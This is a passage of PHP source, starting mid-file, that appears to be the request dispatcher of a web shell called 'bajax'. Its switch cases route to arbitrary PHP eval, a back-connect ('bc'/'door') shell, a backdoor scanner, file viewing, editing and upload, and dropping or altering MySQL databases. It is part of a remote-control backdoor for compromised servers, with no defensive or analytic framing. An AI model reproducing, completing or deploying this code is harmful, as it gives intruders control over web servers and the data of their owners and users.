	session_destroy();
	header("location:?act=mysql");
	break;
	case 'dropdb':
	$r.=$bajax->dropsql();
	break;
	case 'delrow':
	$r.=$bajax->droprow();
	break;
	case 'insertrow':$r.=$bajax->insertrow();break;
	case 'encode':$r.=$bajax->converter();break;
	case 'ser':$r.=$bajax->infoser();break;
	case "eval":$r.=$bajax->phpeval();$r.=$bajax->center();break;
	case 'write':$r.=$bajax->writable();break;
	case 'bds':$r.=$bajax->doorscan();break;
	case 'bc':$r.=$bajax->door();break;
	case 'loc':$r.=$bajax->locate();break;
	case 'search':$r.=$bajax->search();break;
	case 'lihat':$r.=$bajax->lihat($_GET['file']);break;
	case 'out':setcookie('bajax','',time()-3600*24);header("location:".$_SERVER['SCRIPT_NAME']);break;
	default:
	$r.=$bajax->logo();
	break;

}
switch ($_POST['action']) {
	case 'editfile':
		if($bajax->editfile($_POST['file']))
		$r.=header("location:?act=edit&dir=".$bajax->dir()."&file=".$_GET['file']."");
		break;
	case 'renamed':
		if($bajax->rename($_POST['file']))
		$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case "mkdir":
	$r.=$bajax->mkdir();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case "createfile":
	$r.=$bajax->createfile();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case "uploader":
	$r.=$bajax->upload();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case 'createdb':
	$r.=$bajax->createdb($_POST['dbname']);
	break;
	case 'updaterow':
	$r.=$bajax->updaterow();
	break;
	case 'insertrow':
	$r.=$bajax->insertrow();
	break;
}
$r.="</div>";
$r.=$bajax->footer();
$bajax->cookies();
echo $r;
ob_end_flush();
?>
